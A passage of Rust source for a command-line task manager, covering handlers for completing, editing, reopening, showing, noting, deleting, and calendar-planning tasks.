        let ctx = if multi { task_ctx(&task.id) } else { cli_ctx() };
        let pt = task.pt_id.clone().unwrap_or_default();
        if already_applied(db, &ctx)? {
            if !json_mode() {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Ok,
                        "replayed",
                        &pt,
                        &task.title,
                        "idempotency key already applied"
                    )
                );
            }
            results.push(serde_json::json!({
                "pt_id": pt, "task_uuid": task.id, "title": task.title,
                "outcome": "replayed"
            }));
            skip.push(task.id.clone());
            continue;
        }
        let outcome = match tasks::mark_done_noted(db, &task, a.note.as_deref(), &ctx) {
            Ok(o) => o,
            Err(e) => {
                failed += 1;
                report_done_failure(&mut results, query, &e.to_string());
                continue;
            }
        };
        skip.push(task.id.clone());
        match &outcome {
            tasks::DoneOutcome::Completed => {
                // What this close released: dependents that are ready now.
                let unblocked = ptask_core::dag::unblocked_by(db, &task.id).unwrap_or_default();
                if !json_mode() {
                    let detail = if a.note.is_some() {
                        "evidence noted"
                    } else {
                        ""
                    };
                    println!(
                        "{}",
                        ui::outcome(ui::Status::Ok, "done", &pt, &task.title, detail)
                    );
                    for u in &unblocked {
                        println!(
                            "{}",
                            ui::outcome(
                                ui::Status::Changed,
                                "unblocked",
                                u.pt_id.as_deref().unwrap_or_else(|| short_id(&u.id)),
                                &u.title,
                                "ready"
                            )
                        );
                    }
                }
                results.push(serde_json::json!({
                    "pt_id": pt, "task_uuid": task.id, "title": task.title,
                    "outcome": "completed",
                    "unblocked": unblocked.iter().map(|u| serde_json::json!({
                        "pt_id": u.pt_id, "task_uuid": u.id, "title": u.title,
                    })).collect::<Vec<_>>(),
                }));
            }
            tasks::DoneOutcome::Advanced { next_deadline } => {
                if !json_mode() {
                    println!(
                        "{}",
                        ui::outcome(
                            ui::Status::Changed,
                            "advanced",
                            &pt,
                            &task.title,
                            &format!("recurring · next {next_deadline}")
                        )
                    );
                }
                results.push(serde_json::json!({
                    "pt_id": pt, "task_uuid": task.id, "title": task.title,
                    "outcome": "advanced", "next_deadline": next_deadline
                }));
            }
        }
    }
    // Close and continue: only after every requested close went through
    // (a failed close is not a cue to start something else). A claim
    // failure after that does not fail the close: it lands in
    // claimed_next.error. `--json --claim-next` is always the object.
    let claimed = if a.claim_next {
        Some(if failed == 0 {
            take_claimed_next(db, &skip, lease_minutes)
        } else {
            ClaimedNext::Nothing
        })
    } else {
        None
    };
    if json_mode() {
        match &claimed {
            Some(next) => crate::print_json(&serde_json::json!({
                "results": results, "claimed_next": next.to_json()?,
            }))?,
            None => crate::print_json(&results)?,
        }
    } else if failed == 0
        && let Some(next) = &claimed
    {
        match next {
            ClaimedNext::Task { task: n, claim } => {
                let detail = match claim {
                    Some(c) => format!(
                        "next ready · by {} · {}",
                        c.by,
                        lease_phrase(c.expires_at.as_deref())
                    ),
                    None => "next ready · in progress".into(),
                };
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Busy,
                        "claimed",
                        n.pt_id.as_deref().unwrap_or_else(|| short_id(&n.id)),
                        &n.title,
                        &detail
                    )
                )
            }
            ClaimedNext::Nothing => println!("{}", ui::empty("nothing ready to claim next")),
            ClaimedNext::Error(e) => eprintln!(
                "{}",
                ui::section("error", ui::Ink::Red, &format!("claim-next: {e}"))
            ),
        }
    }
    if failed > 0 {
        anyhow::bail!("{failed} of {} task(s) not completed", a.queries.len());
    }
    Ok(())
}

fn report_done_failure(results: &mut Vec<serde_json::Value>, query: &str, error: &str) {
    if !json_mode() {
        eprintln!(
            "{}",
            ui::section("error", ui::Ink::Red, &format!("{query}: {error}"))
        );
    }
    results.push(serde_json::json!({ "query": query, "outcome": "error", "error": error }));
}

fn cmd_priority(db: &Db, a: PriorityArgs) -> Result<()> {
    let level = priority::parse(&a.level).map_err(anyhow::Error::msg)?;
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    let old = task.priority;
    if old == level {
        return emit(
            &serde_json::json!({"pt_id": task.pt_id, "task_uuid": task.id, "priority": level, "changed": false}),
            || {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Mute,
                        "unchanged",
                        task.pt_id.as_deref().unwrap_or(""),
                        &task.title,
                        &format!("already {} ({})", level, priority::label(level))
                    )
                )
            },
        );
    }
    tasks::update_priority(db, &task.id, level, &cli_ctx())?;
    // priority feeds manual_score -> the composite priority_score, so recompute
    // immediately; otherwise ordering (and the dashboard's "Critical Now") lags
    // until the next scheduled `pt scoring run`.
    let note = match ptask_core::scoring::run_once(db, false) {
        Ok(r) => format!(" · rescored {}", r.tasks_scored),
        Err(e) => {
            eprintln!(
                "{}",
                ui::section(
                    "warning",
                    ui::Ink::Amber,
                    &format!("priority set but rescore failed: {e}")
                )
            );
            String::new()
        }
    };
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id,
            "priority": level, "previous": old, "changed": true
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Changed,
                    "priority",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &format!(
                        "{} ({}) → {} ({}){}",
                        old,
                        priority::label(old),
                        level,
                        priority::label(level),
                        note
                    )
                )
            )
        },
    )
}

fn cmd_edit(db: &Db, a: EditArgs) -> Result<()> {
    if a.deadline.is_some() && a.clear_deadline {
        anyhow::bail!("use either --deadline or --clear-deadline, not both");
    }
    let has_deadline = a.deadline.is_some() || a.clear_deadline;
    let has_text = a.title.is_some() || a.desc.is_some();
    let has_labels = !a.label.is_empty() || !a.unlabel.is_empty();
    if !has_deadline && !has_text && !has_labels {
        anyhow::bail!(
            "nothing to edit; use --deadline DATE | --clear-deadline | --title T | --desc D | --label L | --unlabel L"
        );
    }
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    tasks::edit_atomic(
        db,
        &task.id,
        tasks::TaskEdit {
            title: a.title.as_deref(),
            description: a.desc.as_deref(),
            deadline: has_deadline.then_some(a.deadline.as_deref()),
            labels_add: &a.label,
            labels_remove: &a.unlabel,
            ..Default::default()
        },
        &cli_ctx(),
    )?;
    // Only the deadline feeds a score (urgency); a text-only edit needs no rescore.
    let note = if has_deadline {
        match ptask_core::scoring::run_once(db, false) {
            Ok(r) => format!(" · rescored {}", r.tasks_scored),
            Err(e) => {
                eprintln!(
                    "{}",
                    ui::section(
                        "warning",
                        ui::Ink::Amber,
                        &format!("edit applied but rescore failed: {e}")
                    )
                );
                String::new()
            }
        }
    } else {
        String::new()
    };
    let mut parts: Vec<String> = Vec::new();
    if has_deadline {
        // Report what was stored (normalised), not the raw input; `--deadline
        // ''` clears too, so an empty date is never reported as set.
        let stored = tasks::resolve_for_lookup(db, &task.id, true)?.deadline;
        parts.push(format!(
            "deadline {}",
            stored.as_deref().unwrap_or("cleared")
        ));
    }
    if a.title.is_some() {
        parts.push("title".into());
    }
    if a.desc.is_some() {
        parts.push("description".into());
    }
    if !a.label.is_empty() {
        parts.push(format!("+{}", a.label.join(" +")));
    }
    if !a.unlabel.is_empty() {
        parts.push(format!("-{}", a.unlabel.join(" -")));
    }
    emit(
        &serde_json::json!({"pt_id": task.pt_id, "task_uuid": task.id, "edited": parts}),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Changed,
                    "edited",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &format!("{}{}", parts.join(" + "), note)
                )
            )
        },
    )
}

fn cmd_reopen(db: &Db, a: ReopenArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    tasks::reopen(db, &task.id, &cli_ctx())?;
    // Reopening returns the task to the active set; rescore so it re-enters
    // ordering immediately rather than at the next scoring run.
    let note = match ptask_core::scoring::run_once(db, false) {
        Ok(r) => format!(" · rescored {}", r.tasks_scored),
        Err(e) => {
            eprintln!(
                "{}",
                ui::section(
                    "warning",
                    ui::Ink::Amber,
                    &format!("reopened but rescore failed: {e}")
                )
            );
            String::new()
        }
    };
    emit(
        &serde_json::json!({"pt_id": task.pt_id, "task_uuid": task.id, "status": "todo"}),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Changed,
                    "reopened",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &format!("→ pending{note}")
                )
            )
        },
    )
}

/// Short display handle for a task with no PT-N: the first 8 chars of its id.
/// Char-safe — a raw `&id[..8]` panics when the id is shorter than 8 bytes or
/// when byte 8 lands inside a multi-byte scalar. Remote-path ids come from the
/// canonical server's JSON (`pt remote *`), so an unexpected id shape must not
/// crash the CLI; local ids are 36-char UUIDs where this is a no-op.
fn short_id(id: &str) -> &str {
    id.get(..8).unwrap_or(id)
}

fn cmd_show(db: &Db, a: ShowArgs) -> Result<()> {
    let t = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    let d = tasks::load_detail(db, &t.id)?;
    let blocked = if d.depends_on.is_empty() {
        Vec::new()
    } else {
        tasks::open_blockers(db, &t.id).unwrap_or_default()
    };
    let eg = ptask_core::goals::effective_goal(db, &t.id)?;
    if json_mode() {
        let mut v = serde_json::to_value(&t)?;
        v["goal_chain"] = ptask_core::goals::chain_json(&eg.chain);
        v["goal_source"] = serde_json::json!(eg.source.as_str());
        v["notes"] = serde_json::to_value(&d.notes)?;
        v["claim"] = serde_json::to_value(&d.claim)?;
        v["criteria"] = serde_json::to_value(ptask_core::criteria::list(db, &t.id)?)?;
        let links = ptask_core::dupes::links(db, &t.id)?;
        v["duplicate_of"] = serde_json::json!(links.duplicate_of);
        v["merged_in"] = serde_json::json!(links.merged_in);
        crate::print_json(&v)?;
        return Ok(());
    }
    print_lines(render_show(&t, Some(&d), &blocked, &eg.chain));
    let criteria = ptask_core::criteria::list(db, &t.id)?;
    if !criteria.is_empty() {
        println!();
        print_lines(render_criteria(&criteria));
    }
    let links = ptask_core::dupes::links(db, &t.id)?;
    if let Some(of) = &links.duplicate_of {
        println!();
        println!(
            "{}",
            ui::section("duplicate", ui::Ink::Slate, &format!("of {of} (merged)"))
        );
    }
    if !links.merged_in.is_empty() {
        println!();
        println!(
            "{}",
            ui::section("merged in", ui::Ink::Slate, &links.merged_in.join(", "))
        );
    }
    Ok(())
}

fn cmd_context(db: &Db, a: ContextArgs) -> Result<()> {
    let t = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    if json_mode() {
        let brief = ptask_core::goals::task_context(db, &t)?;
        let v = serde_json::json!({
            "pt_id": brief.pt_id,
            "title": brief.title,
            "description": brief.description,
            "goal_source": brief.source.as_str(),
            "why": brief.why_chain.iter().map(|g| serde_json::json!({
                "id": g.g_id(),
                "title": g.title,
                "why": g.why,
            })).collect::<Vec<_>>(),
            "blockers": brief.blockers.iter().map(|b| serde_json::json!({
                "pt_id": b.pt_id,
                "title": b.title,
            })).collect::<Vec<_>>(),
            "notes": ptask_core::notes::list(db, &t.id, ptask_core::notes::MAX_NOTES_LISTED)?,
            "markdown": ptask_core::goals::context_markdown(db, &t)?,
        });
        crate::print_json(&v)?;
        return Ok(());
    }
    print!(
        "{}",
        ui::sanitize(&ptask_core::goals::context_markdown(db, &t)?)
    );
    Ok(())
}

/// The `pt show` page, shared with `pt remote show`: headline with the id and
/// priority badge, the title in paper, then a key/value block. `detail` is
/// optional because a pre-v1.9 remote server has no /detail route.
fn render_show(
    t: &ptask_core::Task,
    d: Option<&tasks::TaskDetail>,
    blocked: &[String],
    why_chain: &[ptask_core::goals::Goal],
) -> Vec<String> {
    let pt = t.pt_id.as_deref().unwrap_or_else(|| short_id(&t.id));
    let mut out = ui::headline(
        pt,
        Some((priority::label(t.priority), ui::priority_ink(t.priority))),
        &ui::strip_ansi(&ui::status_pill(&t.status)),
    );
    for l in ui::wrap(&t.title, ui::term_width().saturating_sub(4), "") {
        out.push(format!("  {}", ui::bold(&l, ui::Ink::Paper)));
    }
    out.push(String::new());
    let mut pairs: Vec<(&str, ui::Cell)> = vec![
        ("status", ui::painted(ui::status_pill(&t.status))),
        (
            "priority",
            ui::painted(format!(
                "{}{}",
                ui::priority_pill(t.priority),
                ui::dim(&format!("  ({})", t.priority), ui::Ink::Slate)
            )),
        ),
        ("deadline", ui::painted(ui::due_cell(t.deadline.as_deref()))),
        (
            "kind",
            match t.deliverable.as_deref() {
                Some(dl) => format!("{} → {dl}", t.kind),
                None => t.kind.clone(),
            }
            .into(),
        ),
    ];
    if let Some(d) = d {
        if !d.labels.is_empty() {
            pairs.push(("labels", d.labels.join(", ").into()));
        }
        if let Some(p) = &d.project {
            pairs.push(("project", p.into()));
        }
        if let Some(m) = d.duration_min {
            pairs.push(("estimate", format!("{m}m").into()));
        }
        if !d.depends_on.is_empty() {
            pairs.push(("depends on", d.depends_on.join(", ").into()));
        }
        if !d.blocks_tasks.is_empty() {
            pairs.push(("blocks", d.blocks_tasks.join(", ").into()));
        }
        if let Some(r) = &d.recurrence_input {
            pairs.push(("recurs", r.into()));
        }
        if let Some(c) = &d.claim {
            let lease = lease_phrase(c.expires_at.as_deref());
            let since =
                c.at.as_deref()
                    .map(|a| format!(" · since {}", a.get(..16).unwrap_or(a).replace('T', " ")))
                    .unwrap_or_default();
            let text = format!("{}{since} · {lease}", c.by);
            pairs.push((
                "claimed by",
                if c.expired {
                    ui::painted(ui::paint(&text, ui::Ink::Amber))
                } else {
                    text.into()
                },
            ));
        }
    }
    pairs.push(("source", (&t.source_type).into()));
    pairs.push(("uuid", ui::painted(ui::dim(&t.id, ui::Ink::Slate))));
    out.extend(ui::kv(&pairs, 14));
    if !blocked.is_empty() {
        out.push(String::new());
        out.push(ui::section(
            "blocked",
            ui::Ink::Amber,
            &format!("cannot close until done: {}", blocked.join(", ")),
        ));
    }
    if !why_chain.is_empty() {
        out.push(String::new());
        out.push(ui::section("why", ui::Ink::Magenta, ""));
        for g in why_chain {
            let title = ui::one_line(&g.title);
            match g.why.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
                Some(why) => out.push(format!("  {title}: {}", ui::one_line(why))),
                None => out.push(format!("  {title}")),
            }
        }
    }
    if !t.description.is_empty() {
        out.push(String::new());
        out.push(ui::section("description", ui::Ink::Cyan, ""));
        for l in t.description.lines() {
            if l.trim().is_empty() {
                out.push(String::new());
                continue;
            }
            for w in ui::wrap(l, ui::term_width().saturating_sub(4), "") {
                out.push(format!("  {}", ui::paint(&w, ui::Ink::Steel)));
            }
        }
    }
    if let Some(d) = d
        && !d.notes.is_empty()
    {
        out.push(String::new());
        out.push(ui::section(
            "notes",
            ui::Ink::Cyan,
            &format!("{} · oldest first · pt note PT-N \"…\"", d.notes.len()),
        ));
        for n in &d.notes {
            let when = n.ts.get(..16).unwrap_or(&n.ts).replace('T', " ");
            let kind = match n.kind.as_str() {
                "note" => String::new(),
                k => format!(" · {k}"),
            };
            out.push(format!(
                "  {} {}{}",
                ui::paint(&when, ui::Ink::Slate),
                ui::paint(n.actor.as_deref().unwrap_or("-"), ui::Ink::Cyan),
                ui::paint(&kind, ui::Ink::Amber),
            ));
            for l in n.text.lines() {
                if l.trim().is_empty() {
                    continue;
                }
                for w in ui::wrap(l, ui::term_width().saturating_sub(6), "") {
                    out.push(format!("    {}", ui::paint(&w, ui::Ink::Steel)));
                }
            }
        }
    }
    out
}

/// The criteria block shared by `pt show` and `pt criteria ls`.
fn render_criteria(criteria: &[ptask_core::criteria::Criterion]) -> Vec<String> {
    let done = criteria.iter().filter(|c| c.done).count();
    let mut out = vec![ui::section(
        "acceptance",
        if done == criteria.len() {
            ui::Ink::Green
        } else {
            ui::Ink::Amber
        },
        &format!(
            "{done}/{} checked · the task closes when all are",
            criteria.len()
        ),
    )];
    for c in criteria {
        let mark = if c.done {
            ui::paint("[x]", ui::Ink::Green)
        } else {
            ui::paint("[ ]", ui::Ink::Amber)
        };
        let by = match (&c.checked_by, c.done) {
            (Some(who), true) => ui::dim(&format!("  · {who}"), ui::Ink::Slate),
            _ => String::new(),
        };
        out.push(format!("  {mark} {}. {}{by}", c.n, ui::one_line(&c.text)));
        if let Some(e) = &c.evidence {
            out.push(format!(
                "        {}",
                ui::paint(&ui::one_line(e), ui::Ink::Steel)
            ));
        }
    }
    out
}

fn cmd_criteria(db: &Db, c: CriteriaCommand) -> Result<()> {
    let ctx = cli_ctx();
    let (query, changed) = match &c {
        CriteriaCommand::Ls { query } => (query.clone(), None),
        CriteriaCommand::Add { query, .. }
        | CriteriaCommand::Check { query, .. }
        | CriteriaCommand::Uncheck { query, .. }
        | CriteriaCommand::Rm { query, .. } => (query.clone(), Some(())),
    };
    // A done task's criteria are history, but still readable (and fixable)
    // by PT-N or uuid; a substring reaches open tasks.
    let task = tasks::resolve_for_lookup(db, &query, false).map_err(anyhow::Error::msg)?;
    let res = match c {
        CriteriaCommand::Ls { .. } => Ok(()),
        CriteriaCommand::Add { text, .. } => {
            ptask_core::criteria::add(db, &task.id, &[text.join(" ")], &ctx).map(|_| ())
        }
        CriteriaCommand::Check { n, evidence, .. } => {
            ptask_core::criteria::check(db, &task.id, n, evidence.as_deref(), &ctx).map(|_| ())
        }
        CriteriaCommand::Uncheck { n, .. } => {
            ptask_core::criteria::uncheck(db, &task.id, n, &ctx).map(|_| ())
        }
        CriteriaCommand::Rm { n, .. } => {
            ptask_core::criteria::remove(db, &task.id, n, &ctx).map(|_| ())
        }
    };
    res.map_err(anyhow::Error::msg)?;
    let criteria = ptask_core::criteria::list(db, &task.id)?;
    let open = criteria.iter().filter(|c| !c.done).count();
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id,
            "criteria": criteria, "unchecked": open,
        }),
        || {
            let pt = task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id));
            if changed.is_some() {
                println!(
                    "{}",
                    ui::outcome(
                        ui::Status::Changed,
                        "criteria",
                        pt,
                        &task.title,
                        &format!("{open} unchecked")
                    )
                );
            }
            if criteria.is_empty() {
                println!("{}", ui::empty("no acceptance criteria"));
            } else {
                print_lines(render_criteria(&criteria));
            }
        },
    )
}

fn cmd_dismiss(db: &Db, a: DismissArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    tasks::dismiss_noted(db, &task.id, a.note.as_deref(), &cli_ctx())?;
    emit(
        &serde_json::json!({"pt_id": task.pt_id, "task_uuid": task.id, "status": "dismissed"}),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Mute,
                    "dismissed",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    ""
                )
            )
        },
    )
}

/// The note text from `pt note` / `pt remote note`: the words joined, or
/// stdin for a lone `-` (evidence is often a command's output).
fn note_text(words: &[String]) -> Result<String> {
    if is_stdin_note(words) {
        return stdin_note_text();
    }
    Ok(words.join(" "))
}

fn stdin_note_text() -> Result<String> {
    if let Some(text) = STDIN_NOTE.get() {
        return Ok(text.clone());
    }
    use std::io::Read;
    let mut buf = String::new();
    std::io::stdin()
        .take((ptask_core::notes::MAX_NOTE_CHARS * 4 + 1) as u64)
        .read_to_string(&mut buf)
        .context("reading the note from stdin")?;
    let _ = STDIN_NOTE.set(buf.clone());
    Ok(buf)
}

fn cmd_note(db: &Db, a: NoteArgs) -> Result<()> {
    let text = note_text(&a.text)?;
    // A uuid too (the cockpit drawer and machine callers address by uuid);
    // a substring still reaches open tasks only.
    let task = tasks::resolve_for_lookup(db, &a.query, false).map_err(anyhow::Error::msg)?;
    let note =
        ptask_core::notes::add(db, &task.id, &text, &cli_ctx()).map_err(anyhow::Error::msg)?;
    emit(
        &serde_json::json!({
            "pt_id": task.pt_id, "task_uuid": task.id, "title": task.title,
            "note": note,
        }),
        || {
            println!(
                "{}",
                ui::outcome(
                    ui::Status::Ok,
                    "noted",
                    task.pt_id.as_deref().unwrap_or(""),
                    &task.title,
                    &format!("{} chars", note.text.chars().count())
                )
            )
        },
    )
}

/// Confirm a permanent delete of `pt` on the operator's TTY. No
/// confirmation possible (piped, agent, --json): refuse loudly — printing
/// "aborted" and exiting 0 read as success to a caller.
fn confirm_delete(pt: &str, title: &str) -> Result<()> {
    if json_mode() || !std::io::stdin().is_terminal() {
        anyhow::bail!("refusing to delete {pt} without --yes (no TTY to confirm)");
    }
    use std::io::Write;
    print!(
        "{}",
        ui::prompt(
            format!(
                "permanently delete {pt} \"{}\"? This cannot be undone.",
                ui::one_line(title)
            ),
            "[y/N]"
        )
    );
    std::io::stdout().flush().ok();
    let mut line = String::new();
    std::io::stdin().read_line(&mut line).ok();
    if !matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
        anyhow::bail!("aborted: {pt} not deleted");
    }
    Ok(())
}

fn cmd_rm(db: &Db, a: RmArgs) -> Result<()> {
    let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
    let pt = task.pt_id.as_deref().unwrap_or("").to_string();
    if !a.yes {
        confirm_delete(&pt, &task.title)?;
    }
    tasks::delete_task(db, &task.id, &cli_ctx())?;
    emit(
        &serde_json::json!({"pt_id": pt, "task_uuid": task.id, "deleted": true}),
        || {
            println!(
                "{}",
                ui::outcome(ui::Status::Bad, "deleted", &pt, &task.title, "permanent")
            )
        },
    )
}

fn cmd_next(db: &Db, a: NextArgs) -> Result<()> {
    let rows = dag::next_ready(db, a.limit)?;
    if json_mode() {
        crate::print_json(&rows)?;
        return Ok(());
    }
    print_lines(ui::headline(
        "ptask · next",
        Some(("ready", ui::Ink::Green)),
        &format!("unblocked, highest first · {}", ui::utc_stamp()),
    ));
    if rows.is_empty() {
        println!("{}", ui::empty("no ready tasks"));
        return Ok(());
    }
    print_lines(ui::task_table(&rows, false, true, false));
    println!(
        "{}",
        ui::footer(rows.len(), "ready task", "pt start PT-N · pt done PT-N")
    );
    Ok(())
}

fn gcalendar_path(explicit: Option<&Path>, home: Option<&std::ffi::OsStr>) -> Result<PathBuf> {
    if let Some(path) = explicit {
        return Ok(path.to_path_buf());
    }
    let home = home
        .filter(|value| !value.is_empty())
        .context("HOME is unset; pass --gcal or set PTASK_GCAL")?;
    Ok(PathBuf::from(home).join(".config/puretensor/gcalendar.py"))
}

/// Wall-clock window of a placement: `offset_min` into the slot, lasting
/// `duration_min`.
fn plan_window(
    slot_start: ptask_core::jiff::Timestamp,
    offset_min: i64,
    duration_min: i64,
) -> Result<(ptask_core::jiff::Timestamp, ptask_core::jiff::Timestamp)> {
    use ptask_core::jiff;
    // try_minutes: `Span::minutes` panics outside jiff's range, and these
    // numbers come from gcalendar.py output and task durations.
    let minutes = |n: i64| {
        jiff::Span::new()
            .try_minutes(n)
            .with_context(|| format!("plan: {n} minutes is out of range"))
    };
    let start_ts = slot_start.checked_add(minutes(offset_min)?)?;
    let end_ts = start_ts.checked_add(minutes(duration_min)?)?;
    Ok((start_ts, end_ts))
}

fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
    use ptask_core::jiff;
    use std::process::Command as Proc;

    let home = std::env::var_os("HOME");
    let gcal = gcalendar_path(a.gcal.as_deref(), home.as_deref())?;

    #[derive(serde::Deserialize)]
    struct FreeSlotJson {
        start: String,
        minutes: i64,
    }
    #[derive(serde::Deserialize)]
    struct FreeBusy {
        tz: String,
        free_slots: Vec<FreeSlotJson>,
    }
    #[derive(serde::Serialize)]
    struct ScheduledItem {
        pt_id: Option<String>,
        title: String,
        start: String,
        end: String,
        duration_min: i64,
        energy: Option<String>,
    }
    #[derive(serde::Serialize)]
    struct UnscheduledItem {
        pt_id: Option<String>,
        title: String,
        duration_min: i64,
    }
    #[derive(serde::Serialize)]
    struct PlanOutput {
        tz: String,
        scheduled: Vec<ScheduledItem>,
        unscheduled: Vec<UnscheduledItem>,
    }

    // 1. free/busy (Python owns tz/date math)
    let out = Proc::new("python3")
        .arg(&gcal)
        .arg(&a.account)
        .arg("freebusy")
        .arg("--json")
        .args(["--days", &a.days.to_string()])
        .args(["--work", &a.work])
        .args(["--tz", &a.tz])
        .args(["--calendar", &a.calendar])
        .output()
        .with_context(|| format!("running {} freebusy", gcal.display()))?;
    if !out.status.success() {
        anyhow::bail!(
            "gcalendar.py freebusy failed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
    let fb: FreeBusy = serde_json::from_slice(&out.stdout).with_context(|| {
        format!(
            "parsing freebusy json: {}",
            String::from_utf8_lossy(&out.stdout)
        )
    })?;

    // 2. ready candidates -> pure first-fit pack over slot capacities
    let candidates = ptask_core::planner::ready_candidates(db, a.limit, a.slot_default)?;
    let slot_caps: Vec<i64> = fb.free_slots.iter().map(|s| s.minutes).collect();
    let plan = ptask_core::planner::pack(&candidates, &slot_caps);

    let tz = jiff::tz::TimeZone::get(&fb.tz).unwrap_or(jiff::tz::TimeZone::UTC);
    let fmt = |ts: jiff::Timestamp| {
        ts.to_zoned(tz.clone())
            .strftime("%Y-%m-%d %H:%M")
            .to_string()
    };

    // 3. resolve placements into wall-clock times
    let mut scheduled = Vec::new();
    for p in &plan.scheduled {
        let slot_start: jiff::Timestamp = fb.free_slots[p.slot]
            .start
            .parse()
            .with_context(|| format!("parse slot start {}", fb.free_slots[p.slot].start))?;
        let (start_ts, end_ts) = plan_window(slot_start, p.offset_min, p.duration_min)?;
        let c = &candidates[p.cand];
        scheduled.push(ScheduledItem {
            pt_id: c.pt_id.clone(),
            title: c.title.clone(),
            start: fmt(start_ts),
            end: fmt(end_ts),
            duration_min: p.duration_min,
            energy: c.energy.clone(),
        });
    }
    let unscheduled: Vec<UnscheduledItem> = plan
        .unscheduled
        .iter()
        .map(|&i| UnscheduledItem {
            pt_id: candidates[i].pt_id.clone(),
            title: candidates[i].title.clone(),
            duration_min: candidates[i].duration_min,
        })
        .collect();

    // 4. optional --write: tentative events on OUR calendar only
    let mut not_written: Vec<String> = Vec::new();
    // Holds created so far: if a later spawn fails, they are already real
    // calendar events and the error must say so.
    let mut created: Vec<String> = Vec::new();
    if a.write {
        for s in &scheduled {
            let pt = s.pt_id.as_deref().unwrap_or("--");
            let title = format!("[pt] {} {}", pt, s.title);
            let spawned = Proc::new("python3")
                .arg(&gcal)
                .arg(&a.account)
                .arg("create")
                .args(["--title", &title])
                .args(["--start", &s.start])
                .args(["--end", &s.end])
                .args(["--calendar", &a.calendar])
                .args(["--description", &format!("advisory-plan {}", pt)])
                .status();
            let status = match spawned {
                Ok(status) => status,
                Err(e) => {
                    let done = if created.is_empty() {
                        "none".to_string()
                    } else {
                        created.join(", ")
                    };
                    return Err(anyhow::Error::new(e).context(format!(
                        "creating the calendar event for {pt}; holds already created: {done}"
                    )));
                }
            };
            if status.success() {
                created.push(pt.to_string());
            } else {
                eprintln!("warning: failed to create event for {}", pt);
                not_written.push(pt.to_string());
            }
        }
    }

    let output = PlanOutput {
        tz: fb.tz.clone(),
        scheduled,
        unscheduled,
    };
    let write = a.write;
    let holds = output.scheduled.len();
    emit(&output, || {
        print_lines(ui::headline(
            "ptask · plan",
            Some(if !write {
                ("advisory", ui::Ink::Amber)
            } else if not_written.is_empty() {
                ("written", ui::Ink::Green)
            } else if not_written.len() == holds {
                ("not written", ui::Ink::Red)
            } else {
                ("partly written", ui::Ink::Amber)
            }),
            &format!("free-slot fit · {}", output.tz),
        ));
        if output.scheduled.is_empty() {
            println!("{}", ui::empty("no task fits the available free slots"));
        } else {
            let width = ui::term_width();
            let cols = [
                ui::Column::new("START", 16),
                ui::Column::right("MIN", 4),
                ui::Column::new("ID", 7),
                ui::Column::new(
                    "TITLE",
                    width
                        .saturating_sub(
                            ui::table_width(&[
                                ui::Column::new("", 16),
                                ui::Column::new("", 4),
                                ui::Column::new("", 7),
                            ]) + 3,
                        )
                        .max(24),
                ),
            ];
            let rows: Vec<Vec<String>> = output
                .scheduled
                .iter()
                .map(|s| {
                    vec![
                        ui::paint(&s.start, ui::Ink::Steel),
                        s.duration_min.to_string(),
                        ui::pt_id(s.pt_id.as_deref().unwrap_or("------")),
                        ui::paint(&s.title, ui::Ink::Paper),
                    ]
                })
                .collect();
            let n = rows.len();
            print_lines(ui::table(
                &cols,
                &ui::painted_rows(rows),
                &Default::default(),
            ));
            println!("{}", ui::footer(n, "hold", ""));
        }
        if !output.unscheduled.is_empty() {
            println!();
            println!(
                "{}",
                ui::section(
                    "unscheduled",
                    ui::Ink::Amber,
                    &format!("{} · no free slot fits", output.unscheduled.len())
                )
            );
            for u in &output.unscheduled {
                println!(
                    "{}",
                    ui::bullet(
                        u.pt_id.as_deref().unwrap_or("------"),
                        format!("{:>3}m  {}", u.duration_min, u.title),
                        ui::Ink::Amber,
                        8
                    )
                );
            }
        }
        if !write {
            println!();
            println!(
                "{}",
                ui::note("advisory only — re-run with --write to add tentative holds")
            );
        }
    })?;
    if !not_written.is_empty() {
        anyhow::bail!(
            "plan --write: {} of {holds} calendar hold(s) not created ({})",
            not_written.len(),
            not_written.join(", ")
        );
    }
    Ok(())
}

fn cmd_view(db: &Db, c: ViewCommand) -> Result<()> {
    match c {
        ViewCommand::Save { name, filter } => {
            let v = views::create(db, &name, &filter).map_err(anyhow::Error::msg)?;
            emit(&v, || {
                println!(
                    "{}",
                    ui::outcome(ui::Status::Ok, "saved", &v.name, &v.filter_dsl, "view")
                )
            })
        }
        ViewCommand::List => {
            let vs = views::list(db).map_err(anyhow::Error::msg)?;
            emit(&vs, || {
                print_lines(ui::headline("ptask · views", None, "saved filters"));
                if vs.is_empty() {
                    println!("{}", ui::empty("no saved views"));
                    return;
                }
                for v in &vs {
                    println!("{}", ui::bullet(&v.name, &v.filter_dsl, ui::Ink::Cyan, 24));
                }
                println!("{}", ui::footer(vs.len(), "view", "pt view show NAME"));
            })
        }
        ViewCommand::Show {
            name,
            limit,
            status,
        } => {
            let v = views::get(db, &name).map_err(anyhow::Error::msg)?;
            let expr = ptask_core::filter::parse(&v.filter_dsl).map_err(anyhow::Error::msg)?;
            // Open tasks by default: the DSL has no status predicate, so a
